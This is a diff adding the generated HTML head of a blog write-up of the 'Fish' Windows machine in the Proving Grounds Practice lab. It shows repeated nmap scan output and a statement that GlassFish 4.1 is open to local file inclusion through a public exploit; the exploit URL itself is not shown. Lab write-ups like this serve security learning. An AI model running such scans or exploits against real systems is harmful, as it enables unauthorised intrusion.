@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>PG Practice - Fish | Fabio Birnegger</title>
+<meta name="keywords" content="Proving Grounds Practice, Windows, Write-Up">
+<meta name="description" content="Box Details
+
+  
+      
+          
+          
+      
+  
+  
+      
+          Difficulty
+          Intermediate
+      
+      
+          Type
+          Windows
+      
+  
+
+Port Scan
+└─$ nmap -sV -sC -p- 192.168.216.168
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-26 19:30 &#43;0200
+Nmap scan report for 192.168.216.168
+Host is up (0.043s latency).
+Not shown: 65516 closed tcp ports (reset)
+PORT      STATE SERVICE              VERSION
+135/tcp   open  msrpc                Microsoft Windows RPC
+139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server        Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: FISHYYY
+|   NetBIOS_Domain_Name: FISHYYY
+|   NetBIOS_Computer_Name: FISHYYY
+|   DNS_Domain_Name: Fishyyy
+|   DNS_Computer_Name: Fishyyy
+|   Product_Version: 10.0.19041
+|_  System_Time: 2021-10-29T11:56:13&#43;00:00
+| ssl-cert: Subject: commonName=Fishyyy
+| Not valid before: 2021-10-28T11:48:50
+|_Not valid after:  2022-04-29T11:48:50
+|_ssl-date: 2021-10-29T11:56:26&#43;00:00; -4y240d05h38m29s from scanner time.
+3700/tcp  open  giop
+| fingerprint-strings: 
+|   GetRequest, X11Probe: 
+|     GIOP
+|   giop: 
+|     GIOP
+|     (IDL:omg.org/SendingContext/CodeBase:1.0
+|     169.254.240.58
+|     169.254.240.58
+|_    default
+4848/tcp  open  http                 Sun GlassFish Open Source Edition  4.1
+|_http-server-header: GlassFish Server Open Source Edition  4.1 
+|_http-title: Login
+5040/tcp  open  unknown
+6060/tcp  open  x11?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 
+|     Accept-Ranges: bytes
+|     ETag: W/&#34;425-1267803922000&#34;
+|     Last-Modified: Fri, 05 Mar 2010 15:45:22 GMT
+|     Content-Type: text/html
+|     Content-Length: 425
+|     Date: Fri, 29 Oct 2021 11:53:47 GMT
+|     Connection: close
+|     Server: Synametrics Web Server v7
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;META HTTP-EQUIV=&#34;REFRESH&#34; CONTENT=&#34;1;URL=app&#34;&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;script type=&#34;text/javascript&#34;&gt;
+|     &lt;!--
+|     currentLocation = window.location.pathname;
+|     if(currentLocation.charAt(currentLocation.length - 1) == &#34;/&#34;){
+|     window.location = window.location &#43; &#34;app&#34;;
+|     }else{
+|     window.location = window.location &#43; &#34;/app&#34;;
+|     //--&gt;
+|     &lt;/script&gt;
+|     Loading Administration console. Please wait...
+|     &lt;/body&gt;
+|     &lt;/html&gt;
+|   HTTPOptions: 
+|     HTTP/1.1 403 
+|     Cache-Control: private
+|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
+|     Set-Cookie: JSESSIONID=F4D252ADE9DDCA2C4DAC70358D0337E9; Path=/
+|     Content-Type: text/html;charset=ISO-8859-1
+|     Content-Length: 5028
+|     Date: Fri, 29 Oct 2021 11:53:48 GMT
+|     Connection: close
+|     Server: Synametrics Web Server v7
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;meta http-equiv=&#34;content-type&#34; content=&#34;text/html; charset=UTF-8&#34; /&gt;
+|     &lt;title&gt;
+|     SynaMan - Synametrics File Manager - Version: 5.1 - build 1595 
+|     &lt;/title&gt;
+|     &lt;meta NAME=&#34;Description&#34; CONTENT=&#34;SynaMan - Synametrics File Manager&#34; /&gt;
+|     &lt;meta NAME=&#34;Keywords&#34; CONTENT=&#34;SynaMan - Synametrics File Manager&#34; /&gt;
+|     &lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;IE=10&#34; /&gt;
+|     &lt;link rel=&#34;icon&#34; type=&#34;image/png&#34; href=&#34;images/favicon.png&#34;&gt;
+|     &lt;link type=&#34;text/css&#34; rel=&#34;stylesheet&#34; href=&#34;images/AjaxFileExplorer.css&#34;&gt;
+|     &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34;
+|   JavaRMI: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Length: 145
+|     Date: Fri, 29 Oct 2021 11:53:42 GMT
+|     Connection: close
+|     Server: Synametrics Web Server v7
+|_    &lt;html&gt;&lt;head&gt;&lt;title&gt;Oops&lt;/title&gt;&lt;body&gt;&lt;h1&gt;Oops&lt;/h1&gt;&lt;p&gt;Well, that didn&#39;t go as we had expected.&lt;/p&gt;&lt;p&gt;This error has been logged.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
+7676/tcp  open  java-message-service Java Message Service 301
+7680/tcp  open  pando-pub?
+8080/tcp  open  http                 Sun GlassFish Open Source Edition  4.1
+|_http-server-header: GlassFish Server Open Source Edition  4.1 
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Data Web
+| http-methods: 
+|_  Potentially risky methods: PUT DELETE TRACE
+8181/tcp  open  ssl/intermapper?
+| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
+| Not valid before: 2014-08-21T13:30:10
+|_Not valid after:  2024-08-18T13:30:10
+|_ssl-date: TLS randomness does not represent time
+8686/tcp  open  java-rmi             Java RMI
+| rmi-dumpregistry: 
+|   jmxrmi
+|     javax.management.remote.rmi.RMIServerImpl_Stub
+|     @169.254.240.58:8686
+|     extends
+|       java.rmi.server.RemoteStub
+|       extends
+|_        java.rmi.server.RemoteObject
+49664/tcp open  msrpc                Microsoft Windows RPC
+49665/tcp open  msrpc                Microsoft Windows RPC
+49666/tcp open  msrpc                Microsoft Windows RPC
+49667/tcp open  msrpc                Microsoft Windows RPC
+49668/tcp open  msrpc                Microsoft Windows RPC
+49669/tcp open  msrpc                Microsoft Windows RPC
+GlassFish Server Open Source Edition  4.1 running on port 4848 is vulnerable to LFI. This public exploit works and with the following URL we can read win.ini:">
+<meta name="author" content="Fabio Birnegger">
+<link rel="canonical" href="http://localhost:1313/writeups/pg_fish/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.b255db539a50b81cdf98f8e589f90be96d438cc741249f7e8f6510cff8a616fd.css" integrity="sha256-slXbU5pQuBzfmPjlifkL6W1DjMdBJJ9&#43;j2UQz/imFv0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/pg_fish/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/writeups/pg_fish/">
+  <meta property="og:site_name" content="Fabio Birnegger">
+  <meta property="og:title" content="PG Practice - Fish">
+  <meta property="og:description" content="Box Details
+Difficulty Intermediate Type Windows Port Scan
+└─$ nmap -sV -sC -p- 192.168.216.168Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-26 19:30 &#43;0200Nmap scan report for 192.168.216.168Host is up (0.043s latency).Not shown: 65516 closed tcp ports (reset)PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?3389/tcp open ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info: | Target_Name: FISHYYY| NetBIOS_Domain_Name: FISHYYY| NetBIOS_Computer_Name: FISHYYY| DNS_Domain_Name: Fishyyy| DNS_Computer_Name: Fishyyy| Product_Version: 10.0.19041|_ System_Time: 2021-10-29T11:56:13&#43;00:00| ssl-cert: Subject: commonName=Fishyyy| Not valid before: 2021-10-28T11:48:50|_Not valid after: 2022-04-29T11:48:50|_ssl-date: 2021-10-29T11:56:26&#43;00:00; -4y240d05h38m29s from scanner time.3700/tcp open giop| fingerprint-strings: | GetRequest, X11Probe: | GIOP| giop: | GIOP| (IDL:omg.org/SendingContext/CodeBase:1.0| 169.254.240.58| 169.254.240.58|_ default4848/tcp open http Sun GlassFish Open Source Edition 4.1|_http-server-header: GlassFish Server Open Source Edition 4.1 |_http-title: Login5040/tcp open unknown6060/tcp open x11?| fingerprint-strings: | GetRequest: | HTTP/1.1 200 | Accept-Ranges: bytes| ETag: W/&#34;425-1267803922000&#34;| Last-Modified: Fri, 05 Mar 2010 15:45:22 GMT| Content-Type: text/html| Content-Length: 425| Date: Fri, 29 Oct 2021 11:53:47 GMT| Connection: close| Server: Synametrics Web Server v7| &lt;html&gt;| &lt;head&gt;| &lt;META HTTP-EQUIV=&#34;REFRESH&#34; CONTENT=&#34;1;URL=app&#34;&gt;| &lt;/head&gt;| &lt;body&gt;| &lt;script type=&#34;text/javascript&#34;&gt;| &lt;!--| currentLocation = window.location.pathname;| if(currentLocation.charAt(currentLocation.length - 1) == &#34;/&#34;){| window.location = window.location &#43; &#34;app&#34;;| }else{| window.location = window.location &#43; &#34;/app&#34;;| //--&gt;| &lt;/script&gt;| Loading Administration console. Please wait...| &lt;/body&gt;| &lt;/html&gt;| HTTPOptions: | HTTP/1.1 403 | Cache-Control: private| Expires: Thu, 01 Jan 1970 00:00:00 GMT| Set-Cookie: JSESSIONID=F4D252ADE9DDCA2C4DAC70358D0337E9; Path=/| Content-Type: text/html;charset=ISO-8859-1| Content-Length: 5028| Date: Fri, 29 Oct 2021 11:53:48 GMT| Connection: close| Server: Synametrics Web Server v7| &lt;!DOCTYPE html&gt;| &lt;html&gt;| &lt;head&gt;| &lt;meta http-equiv=&#34;content-type&#34; content=&#34;text/html; charset=UTF-8&#34; /&gt;| &lt;title&gt;| SynaMan - Synametrics File Manager - Version: 5.1 - build 1595 | &lt;/title&gt;| &lt;meta NAME=&#34;Description&#34; CONTENT=&#34;SynaMan - Synametrics File Manager&#34; /&gt;| &lt;meta NAME=&#34;Keywords&#34; CONTENT=&#34;SynaMan - Synametrics File Manager&#34; /&gt;| &lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;IE=10&#34; /&gt;| &lt;link rel=&#34;icon&#34; type=&#34;image/png&#34; href=&#34;images/favicon.png&#34;&gt;| &lt;link type=&#34;text/css&#34; rel=&#34;stylesheet&#34; href=&#34;images/AjaxFileExplorer.css&#34;&gt;| &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34;| JavaRMI: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8| Content-Length: 145| Date: Fri, 29 Oct 2021 11:53:42 GMT| Connection: close| Server: Synametrics Web Server v7|_ &lt;html&gt;&lt;head&gt;&lt;title&gt;Oops&lt;/title&gt;&lt;body&gt;&lt;h1&gt;Oops&lt;/h1&gt;&lt;p&gt;Well, that didn&#39;t go as we had expected.&lt;/p&gt;&lt;p&gt;This error has been logged.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;7676/tcp open java-message-service Java Message Service 3017680/tcp open pando-pub?8080/tcp open http Sun GlassFish Open Source Edition 4.1|_http-server-header: GlassFish Server Open Source Edition 4.1 |_http-open-proxy: Proxy might be redirecting requests|_http-title: Data Web| http-methods: |_ Potentially risky methods: PUT DELETE TRACE8181/tcp open ssl/intermapper?| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US| Not valid before: 2014-08-21T13:30:10|_Not valid after: 2024-08-18T13:30:10|_ssl-date: TLS randomness does not represent time8686/tcp open java-rmi Java RMI| rmi-dumpregistry: | jmxrmi| javax.management.remote.rmi.RMIServerImpl_Stub| @169.254.240.58:8686| extends| java.rmi.server.RemoteStub| extends|_ java.rmi.server.RemoteObject49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPC GlassFish Server Open Source Edition 4.1 running on port 4848 is vulnerable to LFI. This public exploit works and with the following URL we can read win.ini:">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2026-06-26T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-06-26T00:00:00+00:00">
+    <meta property="article:tag" content="Proving Grounds Practice">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Write-Up">
+    <meta property="og:image" content="http://localhost:1313/writeups/pg_fish/images/writeup_screens/pg_fish/pg_fish_cover.svg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://localhost:1313/writeups/pg_fish/images/writeup_screens/pg_fish/pg_fish_cover.svg">
+  <meta name="twitter:title" content="PG Practice - Fish">
+  <meta name="twitter:description" content="Box Details
+Difficulty Intermediate Type Windows Port Scan
+└─$ nmap -sV -sC -p- 192.168.216.168Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-26 19:30 &#43;0200Nmap scan report for 192.168.216.168Host is up (0.043s latency).Not shown: 65516 closed tcp ports (reset)PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?3389/tcp open ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info: | Target_Name: FISHYYY| NetBIOS_Domain_Name: FISHYYY| NetBIOS_Computer_Name: FISHYYY| DNS_Domain_Name: Fishyyy| DNS_Computer_Name: Fishyyy| Product_Version: 10.0.19041|_ System_Time: 2021-10-29T11:56:13&#43;00:00| ssl-cert: Subject: commonName=Fishyyy| Not valid before: 2021-10-28T11:48:50|_Not valid after: 2022-04-29T11:48:50|_ssl-date: 2021-10-29T11:56:26&#43;00:00; -4y240d05h38m29s from scanner time.3700/tcp open giop| fingerprint-strings: | GetRequest, X11Probe: | GIOP| giop: | GIOP| (IDL:omg.org/SendingContext/CodeBase:1.0| 169.254.240.58| 169.254.240.58|_ default4848/tcp open http Sun GlassFish Open Source Edition 4.1|_http-server-header: GlassFish Server Open Source Edition 4.1 |_http-title: Login5040/tcp open unknown6060/tcp open x11?| fingerprint-strings: | GetRequest: | HTTP/1.1 200 | Accept-Ranges: bytes| ETag: W/&#34;425-1267803922000&#34;| Last-Modified: Fri, 05 Mar 2010 15:45:22 GMT| Content-Type: text/html| Content-Length: 425| Date: Fri, 29 Oct 2021 11:53:47 GMT| Connection: close| Server: Synametrics Web Server v7| &lt;html&gt;| &lt;head&gt;| &lt;META HTTP-EQUIV=&#34;REFRESH&#34; CONTENT=&#34;1;URL=app&#34;&gt;| &lt;/head&gt;| &lt;body&gt;| &lt;script type=&#34;text/javascript&#34;&gt;| &lt;!--| currentLocation = window.location.pathname;| if(currentLocation.charAt(currentLocation.length - 1) == &#34;/&#34;){| window.location = window.location &#43; &#34;app&#34;;| }else{| window.location = window.location &#43; &#34;/app&#34;;| //--&gt;| &lt;/script&gt;| Loading Administration console. Please wait...| &lt;/body&gt;| &lt;/html&gt;| HTTPOptions: | HTTP/1.1 403 | Cache-Control: private| Expires: Thu, 01 Jan 1970 00:00:00 GMT| Set-Cookie: JSESSIONID=F4D252ADE9DDCA2C4DAC70358D0337E9; Path=/| Content-Type: text/html;charset=ISO-8859-1| Content-Length: 5028| Date: Fri, 29 Oct 2021 11:53:48 GMT| Connection: close| Server: Synametrics Web Server v7| &lt;!DOCTYPE html&gt;| &lt;html&gt;| &lt;head&gt;| &lt;meta http-equiv=&#34;content-type&#34; content=&#34;text/html; charset=UTF-8&#34; /&gt;| &lt;title&gt;| SynaMan - Synametrics File Manager - Version: 5.1 - build 1595 | &lt;/title&gt;| &lt;meta NAME=&#34;Description&#34; CONTENT=&#34;SynaMan - Synametrics File Manager&#34; /&gt;| &lt;meta NAME=&#34;Keywords&#34; CONTENT=&#34;SynaMan - Synametrics File Manager&#34; /&gt;| &lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;IE=10&#34; /&gt;| &lt;link rel=&#34;icon&#34; type=&#34;image/png&#34; href=&#34;images/favicon.png&#34;&gt;| &lt;link type=&#34;text/css&#34; rel=&#34;stylesheet&#34; href=&#34;images/AjaxFileExplorer.css&#34;&gt;| &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34;| JavaRMI: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8| Content-Length: 145| Date: Fri, 29 Oct 2021 11:53:42 GMT| Connection: close| Server: Synametrics Web Server v7|_ &lt;html&gt;&lt;head&gt;&lt;title&gt;Oops&lt;/title&gt;&lt;body&gt;&lt;h1&gt;Oops&lt;/h1&gt;&lt;p&gt;Well, that didn&#39;t go as we had expected.&lt;/p&gt;&lt;p&gt;This error has been logged.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;7676/tcp open java-message-service Java Message Service 3017680/tcp open pando-pub?8080/tcp open http Sun GlassFish Open Source Edition 4.1|_http-server-header: GlassFish Server Open Source Edition 4.1 |_http-open-proxy: Proxy might be redirecting requests|_http-title: Data Web| http-methods: |_ Potentially risky methods: PUT DELETE TRACE8181/tcp open ssl/intermapper?| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US| Not valid before: 2014-08-21T13:30:10|_Not valid after: 2024-08-18T13:30:10|_ssl-date: TLS randomness does not represent time8686/tcp open java-rmi Java RMI| rmi-dumpregistry: | jmxrmi| javax.management.remote.rmi.RMIServerImpl_Stub| @169.254.240.58:8686| extends| java.rmi.server.RemoteStub| extends|_ java.rmi.server.RemoteObject49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPC GlassFish Server Open Source Edition 4.1 running on port 4848 is vulnerable to LFI. This public exploit works and with the following URL we can read win.ini:">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "http://localhost:1313/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "PG Practice - Fish",
+      "item": "http://localhost:1313/writeups/pg_fish/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "PG Practice - Fish",
+  "name": "PG Practice - Fish",
+  "description": "Box Details\nDifficulty Intermediate Type Windows Port Scan\n└─$ nmap -sV -sC -p- 192.168.216.168\rStarting Nmap 7.98 ( https://nmap.org ) at 2026-06-26 19:30 +0200\rNmap scan report for 192.168.216.168\rHost is up (0.043s latency).\rNot shown: 65516 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r445/tcp open microsoft-ds?\r3389/tcp open ms-wbt-server Microsoft Terminal Services\r| rdp-ntlm-info: | Target_Name: FISHYYY\r| NetBIOS_Domain_Name: FISHYYY\r| NetBIOS_Computer_Name: FISHYYY\r| DNS_Domain_Name: Fishyyy\r| DNS_Computer_Name: Fishyyy\r| Product_Version: 10.0.19041\r|_ System_Time: 2021-10-29T11:56:13+00:00\r| ssl-cert: Subject: commonName=Fishyyy\r| Not valid before: 2021-10-28T11:48:50\r|_Not valid after: 2022-04-29T11:48:50\r|_ssl-date: 2021-10-29T11:56:26+00:00; -4y240d05h38m29s from scanner time.\r3700/tcp open giop\r| fingerprint-strings: | GetRequest, X11Probe: | GIOP\r| giop: | GIOP\r| (IDL:omg.org/SendingContext/CodeBase:1.0\r| 169.254.240.58\r| 169.254.240.58\r|_ default\r4848/tcp open http Sun GlassFish Open Source Edition 4.1\r|_http-server-header: GlassFish Server Open Source Edition 4.1 |_http-title: Login\r5040/tcp open unknown\r6060/tcp open x11?\r| fingerprint-strings: | GetRequest: | HTTP/1.1 200 | Accept-Ranges: bytes\r| ETag: W/\u0026#34;425-1267803922000\u0026#34;\r| Last-Modified: Fri, 05 Mar 2010 15:45:22 GMT\r| Content-Type: text/html\r| Content-Length: 425\r| Date: Fri, 29 Oct 2021 11:53:47 GMT\r| Connection: close\r| Server: Synametrics Web Server v7\r| \u0026lt;html\u0026gt;\r| \u0026lt;head\u0026gt;\r| \u0026lt;META HTTP-EQUIV=\u0026#34;REFRESH\u0026#34; CONTENT=\u0026#34;1;URL=app\u0026#34;\u0026gt;\r| \u0026lt;/head\u0026gt;\r| \u0026lt;body\u0026gt;\r| \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt;\r| \u0026lt;!--\r| currentLocation = window.location.pathname;\r| if(currentLocation.charAt(currentLocation.length - 1) == \u0026#34;/\u0026#34;){\r| window.location = window.location + \u0026#34;app\u0026#34;;\r| }else{\r| window.location = window.location + \u0026#34;/app\u0026#34;;\r| //--\u0026gt;\r| \u0026lt;/script\u0026gt;\r| Loading Administration console. Please wait...\r| \u0026lt;/body\u0026gt;\r| \u0026lt;/html\u0026gt;\r| HTTPOptions: | HTTP/1.1 403 | Cache-Control: private\r| Expires: Thu, 01 Jan 1970 00:00:00 GMT\r| Set-Cookie: JSESSIONID=F4D252ADE9DDCA2C4DAC70358D0337E9; Path=/\r| Content-Type: text/html;charset=ISO-8859-1\r| Content-Length: 5028\r| Date: Fri, 29 Oct 2021 11:53:48 GMT\r| Connection: close\r| Server: Synametrics Web Server v7\r| \u0026lt;!DOCTYPE html\u0026gt;\r| \u0026lt;html\u0026gt;\r| \u0026lt;head\u0026gt;\r| \u0026lt;meta http-equiv=\u0026#34;content-type\u0026#34; content=\u0026#34;text/html; charset=UTF-8\u0026#34; /\u0026gt;\r| \u0026lt;title\u0026gt;\r| SynaMan - Synametrics File Manager - Version: 5.1 - build 1595 | \u0026lt;/title\u0026gt;\r| \u0026lt;meta NAME=\u0026#34;Description\u0026#34; CONTENT=\u0026#34;SynaMan - Synametrics File Manager\u0026#34; /\u0026gt;\r| \u0026lt;meta NAME=\u0026#34;Keywords\u0026#34; CONTENT=\u0026#34;SynaMan - Synametrics File Manager\u0026#34; /\u0026gt;\r| \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=10\u0026#34; /\u0026gt;\r| \u0026lt;link rel=\u0026#34;icon\u0026#34; type=\u0026#34;image/png\u0026#34; href=\u0026#34;images/favicon.png\u0026#34;\u0026gt;\r| \u0026lt;link type=\u0026#34;text/css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;images/AjaxFileExplorer.css\u0026#34;\u0026gt;\r| \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34;\r| JavaRMI: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8\r| Content-Length: 145\r| Date: Fri, 29 Oct 2021 11:53:42 GMT\r| Connection: close\r| Server: Synametrics Web Server v7\r|_ \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Oops\u0026lt;/title\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;Oops\u0026lt;/h1\u0026gt;\u0026lt;p\u0026gt;Well, that didn\u0026#39;t go as we had expected.\u0026lt;/p\u0026gt;\u0026lt;p\u0026gt;This error has been logged.\u0026lt;/p\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\r7676/tcp open java-message-service Java Message Service 301\r7680/tcp open pando-pub?\r8080/tcp open http Sun GlassFish Open Source Edition 4.1\r|_http-server-header: GlassFish Server Open Source Edition 4.1 |_http-open-proxy: Proxy might be redirecting requests\r|_http-title: Data Web\r| http-methods: |_ Potentially risky methods: PUT DELETE TRACE\r8181/tcp open ssl/intermapper?\r| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US\r| Not valid before: 2014-08-21T13:30:10\r|_Not valid after: 2024-08-18T13:30:10\r|_ssl-date: TLS randomness does not represent time\r8686/tcp open java-rmi Java RMI\r| rmi-dumpregistry: | jmxrmi\r| javax.management.remote.rmi.RMIServerImpl_Stub\r| @169.254.240.58:8686\r| extends\r| java.rmi.server.RemoteStub\r| extends\r|_ java.rmi.server.RemoteObject\r49664/tcp open msrpc Microsoft Windows RPC\r49665/tcp open msrpc Microsoft Windows RPC\r49666/tcp open msrpc Microsoft Windows RPC\r49667/tcp open msrpc Microsoft Windows RPC\r49668/tcp open msrpc Microsoft Windows RPC\r49669/tcp open msrpc Microsoft Windows RPC GlassFish Server Open Source Edition 4.1 running on port 4848 is vulnerable to LFI. This public exploit works and with the following URL we can read win.ini:\n",
+  "keywords": [
+    "Proving Grounds Practice", "Windows", "Write-Up"
+  ],
+  "articleBody": "Box Details\nDifficulty Intermediate Type Windows Port Scan\n└─$ nmap -sV -sC -p- 192.168.216.168\rStarting Nmap 7.98 ( https://nmap.org ) at 2026-06-26 19:30 +0200\rNmap scan report for 192.168.216.168\rHost is up (0.043s latency).\rNot shown: 65516 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r445/tcp open microsoft-ds?\r3389/tcp open ms-wbt-server Microsoft Terminal Services\r| rdp-ntlm-info: | Target_Name: FISHYYY\r| NetBIOS_Domain_Name: FISHYYY\r| NetBIOS_Computer_Name: FISHYYY\r| DNS_Domain_Name: Fishyyy\r| DNS_Computer_Name: Fishyyy\r| Product_Version: 10.0.19041\r|_ System_Time: 2021-10-29T11:56:13+00:00\r| ssl-cert: Subject: commonName=Fishyyy\r| Not valid before: 2021-10-28T11:48:50\r|_Not valid after: 2022-04-29T11:48:50\r|_ssl-date: 2021-10-29T11:56:26+00:00; -4y240d05h38m29s from scanner time.\r3700/tcp open giop\r| fingerprint-strings: | GetRequest, X11Probe: | GIOP\r| giop: | GIOP\r| (IDL:omg.org/SendingContext/CodeBase:1.0\r| 169.254.240.58\r| 169.254.240.58\r|_ default\r4848/tcp open http Sun GlassFish Open Source Edition 4.1\r|_http-server-header: GlassFish Server Open Source Edition 4.1 |_http-title: Login\r5040/tcp open unknown\r6060/tcp open x11?\r| fingerprint-strings: | GetRequest: | HTTP/1.1 200 | Accept-Ranges: bytes\r| ETag: W/\"425-1267803922000\"\r| Last-Modified: Fri, 05 Mar 2010 15:45:22 GMT\r| Content-Type: text/html\r| Content-Length: 425\r| Date: Fri, 29 Oct 2021 11:53:47 GMT\r| Connection: close\r| Server: Synametrics Web Server v7\r| | | | | | | Loading Administration console. Please wait...\r| | | HTTPOptions: | HTTP/1.1 403 | Cache-Control: private\r| Expires: Thu, 01 Jan 1970 00:00:00 GMT\r| Set-Cookie: JSESSIONID=F4D252ADE9DDCA2C4DAC70358D0337E9; Path=/\r| Content-Type: text/html;charset=ISO-8859-1\r| Content-Length: 5028\r| Date: Fri, 29 Oct 2021 11:53:48 GMT\r| Connection: close\r| Server: Synametrics Web Server v7\r| \u003c!DOCTYPE html\u003e\r| | | | | SynaMan - Synametrics File Manager - Version: 5.1 - build 1595 | | | | | | | ",
+  "wordCount" : "937",
+  "inLanguage": "en",
+  "image":"http://localhost:1313/writeups/pg_fish/images/writeup_screens/pg_fish/pg_fish_cover.svg","datePublished": "2026-06-26T00:00:00Z",
+  "dateModified": "2026-06-26T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Fabio Birnegger"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/writeups/pg_fish/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Fabio Birnegger",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Fabio Birnegger (Alt + H)">Fabio Birnegger</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
